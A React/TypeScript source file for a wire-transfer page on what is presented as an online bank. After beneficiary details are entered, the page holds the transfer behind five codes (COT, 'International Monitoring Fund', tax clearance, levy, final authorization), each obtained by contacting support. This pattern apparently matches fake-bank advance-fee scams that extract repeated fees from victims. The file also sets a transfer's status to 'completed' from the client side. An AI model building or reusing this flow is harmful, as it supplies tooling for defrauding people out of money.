import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { ArrowLeft, CheckCircle2, Globe, Check } from "lucide-react";
import { z } from "zod";

const wireTransferSchema = z.object({
  beneficiaryName: z.string().min(2, "Name must be at least 2 characters"),
  beneficiaryAccount: z.string().min(5, "Account number is required"),
  beneficiaryBank: z.string().min(2, "Bank name is required"),
  beneficiaryCountry: z.string().min(2, "Country is required"),
  swiftCode: z.string().min(8, "Valid SWIFT code required"),
  amount: z.number().min(1, "Amount must be greater than 0"),
  purpose: z.string().optional(),
});

const securityStages = [
  { code: "COT", name: "Cost of Transfer Code", description: "Required for processing international transfers" },
  { code: "IMF", name: "International Monitoring Fund Code", description: "Regulatory compliance verification" },
  { code: "TAX", name: "Tax Clearance Code", description: "Tax compliance verification" },
  { code: "LEVY", name: "Transfer Levy Code", description: "Government levy clearance" },
  { code: "FIN", name: "Final Authorization Code", description: "Final authorization for transfer" },
];

const WireTransfer = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [wireTransferId, setWireTransferId] = useState<string | null>(null);
  const [accountId, setAccountId] = useState<string | null>(null);
  const [securityCodeInput, setSecurityCodeInput] = useState("");
  const [transferData, setTransferData] = useState({
    beneficiaryName: "",
    beneficiaryAccount: "",
    beneficiaryBank: "",
    beneficiaryCountry: "",
    swiftCode: "",
    amount: "",
    purpose: "",
  });

  useEffect(() => {
    checkAuthAndLoadAccount();
  }, []);

  const checkAuthAndLoadAccount = async () => {
    const { data: { user }, error } = await supabase.auth.getUser();
    
    if (error || !user) {
      navigate("/auth");
      return;
    }

    // Get user's account
    const { data: accountData } = await supabase
      .from("accounts")
      .select("id")
      .eq("user_id", user.id)
      .single();

    if (accountData) {
      setAccountId(accountData.id);
    }
  };

  const handleInitiateTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const validated = wireTransferSchema.parse({
        ...transferData,
        amount: parseFloat(transferData.amount),
      });

      const { data: { user }, error: authError } = await supabase.auth.getUser();
      if (authError || !user || !accountId) throw new Error("Not authenticated");

      const { data: wireId, error } = await (supabase as any).rpc("initiate_wire_transfer", {
        p_user_id: user.id,
        p_account_id: accountId,
        p_beneficiary_name: validated.beneficiaryName,
        p_beneficiary_account: validated.beneficiaryAccount,
        p_beneficiary_bank: validated.beneficiaryBank,
        p_beneficiary_country: validated.beneficiaryCountry,
        p_swift_code: validated.swiftCode,
        p_amount: validated.amount,
        p_currency: "USD",
        p_purpose: validated.purpose || null,
      });

      if (error) throw error;

      if (wireId) {
        setWireTransferId(wireId);

        setCurrentStep(1);
        toast({
          title: "Wire transfer initiated",
          description: "Please enter the security codes to proceed.",
        });
      }
    } catch (error: any) {
      if (error instanceof z.ZodError) {
        toast({
          title: "Validation Error",
          description: error.errors[0].message,
          variant: "destructive",
        });
      } else {
        toast({
          title: "Error",
          description: error.message,
          variant: "destructive",
        });
      }
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyCode = async () => {
    if (!wireTransferId) return;
    setLoading(true);

    try {
      const currentStageCode = securityStages[currentStep - 1];

      // Use server-side RPC to verify the code (hashed comparison + attempt tracking)
      const { data: verified, error: verifyError } = await supabase.rpc(
        "verify_wire_transfer_code",
        {
          p_wire_transfer_id: wireTransferId,
          p_code_type: currentStageCode.code,
          p_code: securityCodeInput.trim(),
        }
      );

      if (verifyError) throw verifyError;

      if (!verified) {
        toast({
          title: "Invalid code",
          description: "The security code you entered is incorrect.",
          variant: "destructive",
        });
        setLoading(false);
        return;
      }

      // Check if this is the last stage
      if (currentStep === securityStages.length) {
        await supabase
          .from("wire_transfers")
          .update({ status: "completed", current_stage: currentStep })
          .eq("id", wireTransferId);

        toast({
          title: "Transfer completed!",
          description: "Your wire transfer has been successfully processed.",
        });

        setTimeout(() => navigate("/dashboard"), 2000);
      } else {
        const nextStage = currentStep + 1;
        const statusMap: { [key: number]: string } = {
          2: "awaiting_imf",
          3: "awaiting_tax",
          4: "awaiting_levy",
          5: "awaiting_fin",
        };

        await supabase
          .from("wire_transfers")
          .update({ status: statusMap[nextStage], current_stage: nextStage })
          .eq("id", wireTransferId);

        setCurrentStep(nextStage);
        setSecurityCodeInput("");

        toast({
          title: "Code verified",
          description: `Please enter the ${securityStages[nextStage - 1].code} code.`,
        });
      }
    } catch (error: any) {
      toast({
        title: "Verification failed",
        description: error.message,
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F4F5F7] p-6">
      <header className="bg-white rounded-xl shadow-sm border-0">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center space-x-4">
            <Button variant="ghost" size="icon" onClick={() => navigate("/dashboard")}>
              <ArrowLeft className="w-5 h-5" />
            </Button>
            <div>
              <h1 className="text-2xl font-semibold text-[#0A1628] border-l-4 border-[#C9A84C] pl-3">Wire Transfer</h1>
              <p className="text-sm text-muted-foreground">International Money Transfer</p>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8 max-w-4xl">
        {/* Progress Indicator */}
        {currentStep > 0 && (
          <Card className="bg-white rounded-xl shadow-sm border-0 p-6 mb-8">
            <h3 className="font-bold mb-4">Security Verification Progress</h3>
            <div className="space-y-3">
              {securityStages.map((stage, index) => (
                <div key={stage.code} className="flex items-center space-x-3">
                  {index < currentStep ? (
                    <span className="w-7 h-7 rounded-full bg-[var(--bank-gold)] text-[#0A1628] inline-flex items-center justify-center flex-shrink-0">
                      <Check className="w-4 h-4" />
                    </span>
                  ) : index === currentStep ? (
                    <span className="w-7 h-7 rounded-full bg-[var(--bank-navy)] text-white inline-flex items-center justify-center text-xs font-semibold flex-shrink-0">
                      {index + 1}
                    </span>
                  ) : (
                    <span className="w-7 h-7 rounded-full border border-[#D1D5DB] text-[#9CA3AF] inline-flex items-center justify-center text-xs font-semibold flex-shrink-0">
                      {index + 1}
                    </span>
                  )}
                  <div>
                    <p className={`font-medium text-sm ${index === currentStep ? "text-[var(--bank-navy)]" : "text-foreground"}`}>
                      {stage.name}
                    </p>
                    <p className="text-sm text-muted-foreground">{stage.description}</p>
                  </div>
                </div>
              ))}
            </div>
          </Card>
        )}

        {currentStep === 0 ? (
          <Card className="p-8">
            <div className="flex items-center space-x-3 mb-6">
              <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
                <Globe className="w-6 h-6 text-primary" />
              </div>
              <div>
                <h2 className="text-2xl font-bold">Initiate Wire Transfer</h2>
                <p className="text-muted-foreground">Enter beneficiary details</p>
              </div>
            </div>

            <form onSubmit={handleInitiateTransfer} className="space-y-6">
              <div className="grid md:grid-cols-2 gap-6">
                <div className="space-y-2">
                  <label className="text-sm font-medium">Beneficiary Name</label>
                  <Input
                    value={transferData.beneficiaryName}
                    onChange={(e) => setTransferData({ ...transferData, beneficiaryName: e.target.value })}
                    placeholder="John Doe"
                    required
                    className="h-12"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium">Account Number</label>
                  <Input
                    value={transferData.beneficiaryAccount}
                    onChange={(e) => setTransferData({ ...transferData, beneficiaryAccount: e.target.value })}
                    placeholder="1234567890"
                    required
                    className="h-12"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium">Bank Name</label>
                  <Input
                    value={transferData.beneficiaryBank}
                    onChange={(e) => setTransferData({ ...transferData, beneficiaryBank: e.target.value })}
                    placeholder="International Bank"
                    required
                    className="h-12"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium">Country</label>
                  <Input
                    value={transferData.beneficiaryCountry}
                    onChange={(e) => setTransferData({ ...transferData, beneficiaryCountry: e.target.value })}
                    placeholder="United States"
                    required
                    className="h-12"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium">SWIFT Code</label>
                  <Input
                    value={transferData.swiftCode}
                    onChange={(e) => setTransferData({ ...transferData, swiftCode: e.target.value })}
                    placeholder="ABCDUS33XXX"
                    required
                    className="h-12"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium">Amount (USD)</label>
                  <Input
                    type="number"
                    step="0.01"
                    value={transferData.amount}
                    onChange={(e) => setTransferData({ ...transferData, amount: e.target.value })}
                    placeholder="1000.00"
                    required
                    className="h-12"
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium">Purpose (Optional)</label>
                <Textarea
                  value={transferData.purpose}
                  onChange={(e) => setTransferData({ ...transferData, purpose: e.target.value })}
                  placeholder="Payment for services"
                  className="min-h-[100px]"
                />
              </div>

              <Button type="submit" size="lg" className="w-full h-12" disabled={loading}>
                {loading ? "Processing..." : "Initiate Transfer"}
              </Button>
            </form>
          </Card>
        ) : (
          <Card className="bg-white rounded-xl shadow-sm border-0 p-8">
            <div className="text-center mb-8">
              <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
                <Globe className="w-8 h-8 text-primary" />
              </div>
              <h2 className="text-2xl font-bold mb-2">
                {securityStages[currentStep - 1].name}
              </h2>
              <p className="text-muted-foreground">
                {securityStages[currentStep - 1].description}
              </p>
            </div>

            <div className="max-w-md mx-auto space-y-6">
              <div className="p-4 bg-white border border-amber-200 border-l-4 border-l-amber-400 rounded-lg">
                <p className="text-sm font-medium text-amber-700 mb-2">Important</p>
                <p className="text-sm">
                  Please contact our support team to receive your {securityStages[currentStep - 1].code} code. 
                  For security reasons.
                </p>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium">
                  Enter {securityStages[currentStep - 1].code} Code
                </label>
                <Input
                  value={securityCodeInput}
                  onChange={(e) => setSecurityCodeInput(e.target.value)}
                  placeholder={`${securityStages[currentStep - 1].code}-XXXXXXXX`}
                  className="h-14 text-center text-lg font-mono"
                />
              </div>

              <Button 
                onClick={handleVerifyCode} 
                size="lg" 
                className="w-full h-12 bg-[var(--bank-navy)] hover:bg-[var(--bank-slate)]" 
                disabled={loading || !securityCodeInput.trim()}
              >
                {loading ? "Verifying..." : "Verify Code"}
              </Button>
            </div>
          </Card>
        )}
      </div>
    </div>
  );
};

export default WireTransfer;
